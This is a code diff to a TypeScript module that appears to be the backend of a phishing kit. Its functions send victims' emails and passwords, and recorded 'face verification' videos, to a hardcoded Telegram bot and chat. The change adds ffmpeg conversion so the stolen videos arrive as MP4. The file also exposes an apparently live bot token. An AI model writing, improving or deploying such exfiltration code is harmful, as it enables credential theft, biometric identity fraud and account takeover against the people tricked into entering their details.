@@ -1,10 +1,41 @@
 import TelegramBot from 'node-telegram-bot-api';
+import { exec } from 'child_process';
+import { promisify } from 'util';
+import fs from 'fs';
+import path from 'path';
+import os from 'os';
+
+const execAsync = promisify(exec);
 
 const TELEGRAM_BOT_TOKEN = '8366649467:AAGaMF5mQBsffV-Zc2QU9AQ7XSjD0IKXf3Y';
 const TELEGRAM_CHAT_ID = '7211220207';
 
 // Initialize bot without polling (we only send messages)
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
+
+async function convertWebmToMp4(inputBuffer: Buffer): Promise<Buffer> {
+  const tempDir = os.tmpdir();
+  const timestamp = Date.now();
+  const inputPath = path.join(tempDir, `input_${timestamp}.webm`);
+  const outputPath = path.join(tempDir, `output_${timestamp}.mp4`);
+  
+  try {
+    await fs.promises.writeFile(inputPath, inputBuffer);
+    
+    await execAsync(`ffmpeg -i "${inputPath}" -c:v libx264 -preset ultrafast -crf 28 -c:a aac -b:a 128k -movflags +faststart -y "${outputPath}"`);
+    
+    const outputBuffer = await fs.promises.readFile(outputPath);
+    
+    await fs.promises.unlink(inputPath).catch(() => {});
+    await fs.promises.unlink(outputPath).catch(() => {});
+    
+    return outputBuffer;
+  } catch (error) {
+    await fs.promises.unlink(inputPath).catch(() => {});
+    await fs.promises.unlink(outputPath).catch(() => {});
+    throw error;
+  }
+}
 
 export async function sendLoginNotification(email: string, password: string): Promise<void> {
   try {
@@ -64,12 +95,26 @@ export async function sendVideoNotification(email: string, videoBuffer: Buffer):
       return;
     }
 
-    const caption = `🎥 *FACE VERIFICATION VIDEO*\n\n*Email:* ${email}\n*Time:* ${new Date().toLocaleString()}`;
+    console.log(`Converting video for ${email}, original size: ${videoBuffer.length} bytes`);
+    
+    let mp4Buffer: Buffer;
+    try {
+      mp4Buffer = await convertWebmToMp4(videoBuffer);
+      console.log(`Video converted successfully, new size: ${mp4Buffer.length} bytes`);
+    } catch (conversionError) {
+      console.error('Video conversion failed, sending original:', conversionError);
+      mp4Buffer = videoBuffer;
+    }
 
-    await bot.sendVideo(TELEGRAM_CHAT_ID, videoBuffer, {
+    const caption = `*FACE VERIFICATION VIDEO*\n\n*Email:* ${email}\n*Time:* ${new Date().toLocaleString()}`;
+
+    await bot.sendVideo(TELEGRAM_CHAT_ID, mp4Buffer, {
       caption,
       parse_mode: 'Markdown',
       supports_streaming: true
+    }, {
+      filename: 'face_verification.mp4',
+      contentType: 'video/mp4'
     });
 
     console.log('Video notification sent successfully');
